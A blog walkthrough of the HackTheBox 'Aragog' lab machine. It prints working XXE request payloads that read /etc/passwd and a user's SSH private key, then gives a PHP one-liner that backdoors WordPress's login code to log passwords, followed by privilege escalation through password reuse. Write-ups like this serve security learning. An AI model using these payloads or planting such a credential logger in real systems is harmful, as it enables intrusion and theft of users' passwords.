---
layout: post
title: "HackTheBox - Aragog writeup"
subtitle: "~ Walkthrough of Aragog machine from HackTheBox ~"
date: 2018-07-27
author: V3ded
category: CTF
tags: blog ctf pentesting hackthebox
finished: true
excerpt_separator: <!--more-->
---

<img src="/img/blog/htb-aragog/htb-aragog-00.png" width="417" height="136">
# Introduction
*Aragog* is a machine made by [@egre55](https://twitter.com/egre55){:target="_blank"}. It took me roughly 3-4 hours to root as a whole and I would consider it around medium difficulty. Aragog's pwnage revolves around a simple XXE and backdooring of a Wordpress install to capture administrator's password which can then be reused for privilege escalation.<!--more-->

***

# Scanning & Enumeration
Wind up good old nmap:

```console
root@EdgeOfNight:~# nmap 10.10.10.78 -sS -T4 -sV -sC 

Starting Nmap 7.60 ( https://nmap.org ) at 2018-07-27 10:27 BST
Warning: 10.10.10.78 giving up on port because retransmission cap hit (6).
Nmap scan report for aragog (10.10.10.78)
Host is up (0.043s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r--r--r--    1 ftp      ftp            86 Dec 21  2017 test.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.133
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 5
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ad:21:fb:50:16:d4:93:dc:b7:29:1f:4c:c2:61:16:48 (RSA)
|   256 2c:94:00:3c:57:2f:c2:49:77:24:aa:22:6a:43:7d:b1 (ECDSA)
|_  256 9a:ff:8b:e4:0e:98:70:52:29:68:0e:cc:a0:7d:5c:1f (EdDSA)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.76 seconds
```
2 interesting services pop up - FTP and HTTP. I usually leave out SSH when it comes to enumeration unless I see that it is running some archaic version. SSH exploits are very rare and so it makes no sense to actually look for vulnerabilities there. 

### - FTP

Connect to FTP and view the files by downloading them:
```console
root@EdgeOfNight:~# ftp 10.10.10.78
Connected to 10.10.10.78.
220 (vsFTPd 3.0.3)
Name (10.10.10.78:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-r--r--r--    1 ftp      ftp            86 Dec 21  2017 test.txt
226 Directory send OK.
ftp> get test.txt /tmp/test.txt
local: /tmp/test.txt remote: test.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for test.txt (86 bytes).
226 Transfer complete.
86 bytes received in 0.00 secs (1.8640 MB/s)
```

The insides of test.txt are made up of what looks like XML:
{% highlight xml %}
<details>
    <subnet_mask>255.255.255.192</subnet_mask>
    <test></test>
</details>
{% endhighlight %}
Nothing we can do from here on. Just note down we have this file and move on.

### - HTTP
Viewing the webpage in our browser only shows us a default Apache landing page:
<a href="/img/blog/htb-aragog/htb-aragog-01.png" target="_blank"><img class="centerImgLarge" src="/img/blog/htb-aragog/htb-aragog-01.png"></a>

As per usual in this scenario, I use directory bruteforcing tool ([gobuster](https://github.com/OJ/gobuster){:target="_blank"}) to find hidden directories or other content.
```console
root@EdgeOfNight:~# gobuster -u http://10.10.10.78 -x php -e -t 25 -w /usr/share/wordlists/dirb/big.txt 

Gobuster v1.2                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.78/
[+] Threads      : 25
[+] Wordlist     : /usr/share/wordlists/dirb/big.txt
[+] Status codes : 200,204,301,302,307
[+] Extensions   : .php
[+] Expanded     : true
=====================================================
http://10.10.10.78/hosts.php (Status: 200)
=====================================================
```
We get 1 result - `http://10.10.10.78/hosts.php` which looks like this:

<a href="/img/blog/htb-aragog/htb-aragog-02.png" target="_blank"><img class="centerImgSmall" src="/img/blog/htb-aragog/htb-aragog-02.png"></a>

The webpage says: *There are 4294967294 possible hosts for*. Strange... Is this maybe linked to the previous txt file we found on the FTP server? Is this PHP site calculating the amount of hosts on a subnet based on XML input? Can we maybe inject malicious XML?

***

# Exploitation
Indeed, we can! First of all, verify if our assumptions are correct. By submitting a special type of HTTP request (using Burpsuite interception proxy for example): 
```console
GET /hosts.php HTTP/1.1
Host: 10.10.10.78
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 211

<details>
    <subnet_mask>255.255.255.0</subnet_mask>
    <test></test>
</details>
```
we will get a valid return page with the amount of hosts a subnet would have.

<a href="/img/blog/htb-aragog/htb-aragog-03.png" target="_blank"><img class="centerImgSmall" src="/img/blog/htb-aragog/htb-aragog-03.png"></a>

This means that there is something on the backend that parses our XML input. If improperly handled, an attacker can do malicious stuff. By defining an external entity, an attacker can include any content which he/she wants to read. Upon parsing, this entity will be read out which will hence print content of targeted file. This type of attack is called XXE (XML external entity attack). 

So, doing a bit of XML magic, we can read any file on the file server (considering we have the read permission to the given file):

```console
GET /hosts.php HTTP/1.1
Host: 10.10.10.78
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 211

<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<details>
    <subnet_mask>&xxe;</subnet_mask>
    <test></test>
</details>
```

This prints out contents of the */etc/passwd/file*. 

<a href="/img/blog/htb-aragog/htb-aragog-04.png" target="_blank"><img class="centerImgLarge" src="/img/blog/htb-aragog/htb-aragog-04.png"></a>

> Note: There are also methods which would allow you to execute PHP code such as php://input filter, however they didn't work.

You could easily automate this and make a simple python script which would make this output a lot nicer (or simply view the page source manually to beautify the output). For the sake of keeping this blogpost short, let's not. Anyways, 2 users pop up - **florian** and **cliff**. Upon trying to login as either of them to SSH, we get the following error:

<a href="/img/blog/htb-aragog/htb-aragog-05.png" target="_blank"><img class="centerImgMedium" src="/img/blog/htb-aragog/htb-aragog-05.png"></a>

Password authentication disabled. That's a bummer. Fair enough, let's see if we can retrieve a private SSH key for one of the users. HA, It's our lucky day! Florian has his private SSH key exposed. Here's the entity which will print out the contents of the **id_rsa** file. `<!ENTITY xxe SYSTEM "file:///home/florian/.ssh/id_rsa" >]>`.

<a href="/img/blog/htb-aragog/htb-aragog-06.png" target="_blank"><img class="centerImgSmall" src="/img/blog/htb-aragog/htb-aragog-06.png"></a>

Save this as *florian.key* and use it to login into SSH. 
```console
root@EdgeOfNight:~# ssh -i florian.key florian@10.10.10.78
Last login: Fri Jul 27 04:44:11 2018 from 10.10.14.133
florian@aragog:~$ hostname
aragog.htb
florian@aragog:~$ 
```
**Go and get your user flag!**

*** 

# Privilege escalation
Time to enumerate! However be careful, there are few rabbit holes in this stage. E.g finding the root password of mysql database in wp-config, connecting to it & attempting to crack administrators password or messing around with CUPS server which is running on local port 631. 


The solution itself, is a bit more trickier. If you navigate to `/var/www/html`, you will notice that there is a *dev_wiki* directory (owned by cliff) which we weren't able to find with directory bruteforce. It has 777 permissions, which means it enables us to do some funky stuff - uploading webshells, editing configs and so on. 

<a href="/img/blog/htb-aragog/htb-aragog-07.png" target="_blank"><img class="centerImgMedium" src="/img/blog/htb-aragog/htb-aragog-07.png"></a>

Before we do that though, view the webpage itself. Try to look for juicy information! There will be a slight complication - whenever you visit `10.10.10.78/dev_wiki`, it will get changed to `aragog/dev_wiki` which will prevent the webpage from rendering correctly. You can bypass this issue by editing your */etc/hosts* file like this:

```console
127.0.0.1	localhost
127.0.1.1	EdgeOfNight 
10.10.10.78	aragog #ADD THIS LINE!

...
...
```

Next time, it should load up correctly. If it doesn't, clear your browser cache & delete all your cookies.

<a href="/img/blog/htb-aragog/htb-aragog-08.png" target="_blank"><img class="centerImgLarge" src="/img/blog/htb-aragog/htb-aragog-08.png"></a>

Scrolling through the webpage I find an interesting post which says:

<a href="/img/blog/htb-aragog/htb-aragog-09.png" target="_blank"><img class="centerImgMedium" src="/img/blog/htb-aragog/htb-aragog-09.png"></a>

In case you can't see the image:
```
Hi Florian, Thought we could use a wiki.  Feel free to log in and have a poke around – but as I’m messing about with a lot of changes I’ll probably be restoring the site from backup fairly frequently! I’ll be logging in regularly and will email the wider team when I need some more … 
```

The line where Cliff says "I’ll be logging in regularly" is very important. If you recall, I mentioned that cracking the Administrator's password from the MySQL database failed. Well, why bother with cracking? The Wordpress directory in */var/www/html/dev_wiki/* is writable by everyone which means that we should be easily able to backdoor a file which is in charge of handling logins. Simply said, we can keylogg Cliff's login attempt and capture his password.

Here is a php one liner I found to work:
{% highlight php %} file_put_contents("/var/www/html/dev_wiki/wp-includes/v3ded.php", $_POST['log'] . " : " . $_POST['pwd'] . "\n", FILE_APPEND);{% endhighlight %} You can place it into multiple locations - `wp-login.php` or `wp-includes/user.php`. 

I'll go with the latter. Edit the *wp-includes/user.php* file so line 39 onwards looks like this:
{% highlight php %}

if ( ! empty($_POST['pwd']) ) {
	$credentials['user_password'] = $_POST['pwd'];
	file_put_contents("/var/www/html/dev_wiki/wp-includes/v3ded.php", $_POST['log'] . " : " . $_POST['pwd'] . "\n", FILE_APPEND);

}
...
...
...

{% endhighlight %}

<a href="/img/blog/htb-aragog/htb-aragog-10.png" target="_blank"><img class="centerImgHuge" src="/img/blog/htb-aragog/htb-aragog-10.png"></a>

This saves the login information into a file called v3ded.php which can be located at `/var/www/html/dev_wiki/wp-includes/v3ded.php`. Simply wait for Cliff to login, and view the file! It should have his username and password.

<a href="/img/blog/htb-aragog/htb-aragog-11.png" target="_blank"><img class="centerImgMedium" src="/img/blog/htb-aragog/htb-aragog-11.png"></a>

Now, because people are silly and reuse passwords... We can use the very same password to **su** to root. Simple as that!

<a href="/img/blog/htb-aragog/htb-aragog-12.png" target="_blank"><img class="centerImgMedium" src="/img/blog/htb-aragog/htb-aragog-12.png"></a>

***

# Conclusion
Congratulations once again! Thanks to [@egre55](https://twitter.com/egre55){:target="_blank"} for making this machine, I learnt a thing or two! Hope you guys feel the same and see you next time!

~V3
